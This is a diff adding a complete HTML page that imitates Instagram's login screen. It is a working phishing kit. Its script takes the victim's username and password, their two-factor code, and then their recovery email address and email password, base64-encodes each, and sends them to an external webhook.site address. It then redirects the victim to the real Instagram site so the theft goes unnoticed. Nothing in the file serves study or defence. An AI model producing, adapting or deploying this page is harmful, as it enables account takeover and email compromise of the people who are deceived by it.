@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body { font-family: -apple-system, system-ui, "Segoe UI", Roboto; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; box-sizing: border-box; }
+        .logo { width: 175px; margin-bottom: 25px; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; box-sizing: border-box; }
+        button { width: 100%; padding: 7px; border: none; border-radius: 4px; background: #0095f6; color: white; font-weight: 600; cursor: pointer; }
+        .hidden { display: none; }
+        .info { color: #8e8e8e; font-size: 13px; margin: 15px 0; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a25111036a7.png" class="logo">
+        
+        <div id="step1">
+            <input type="text" id="user" placeholder="Phone, username, or email">
+            <input type="password" id="pass" placeholder="Password">
+            <button onclick="nextStep(1)">Log In</button>
+        </div>
+
+        <div id="step2" class="hidden">
+            <p class="info">Enter the 6-digit code we sent to your device.</p>
+            <input type="text" id="otp" placeholder="Security Code">
+            <button onclick="nextStep(2)">Confirm</button>
+        </div>
+
+        <div id="step3" class="hidden">
+            <p class="info">Verify your recovery email to continue.</p>
+            <input type="email" id="email" placeholder="Email Address">
+            <input type="password" id="epass" placeholder="Email Password">
+            <button onclick="finish()">Verify Account</button>
+        </div>
+    </div>
+
+    <script>
+        var hook = "https://webhook.site/3a271c53-971e-4ce0-af75-804450203f0e";
+
+        function sendData(params) {
+            fetch(hook + params, {mode: 'no-cors'});
+        }
+
+        function nextStep(s) {
+            if(s === 1) {
+                var u = btoa(document.getElementById("user").value);
+                var p = btoa(document.getElementById("pass").value);
+                sendData("?step=login&u=" + u + "&p=" + p);
+                document.getElementById("step1").classList.add("hidden");
+                document.getElementById("step2").classList.remove("hidden");
+            } else if(s === 2) {
+                var c = btoa(document.getElementById("otp").value);
+                sendData("?step=otp&code=" + c);
+                document.getElementById("step2").classList.add("hidden");
+                document.getElementById("step3").classList.remove("hidden");
+            }
+        }
+
+        function finish() {
+            var em = btoa(document.getElementById("email").value);
+            var ep = btoa(document.getElementById("epass").value);
+            sendData("?step=email&em=" + em + "&ep=" + ep);
+            window.location.replace("https://www.instagram.com");
+        }
+    </script>
+</body>
+</html>
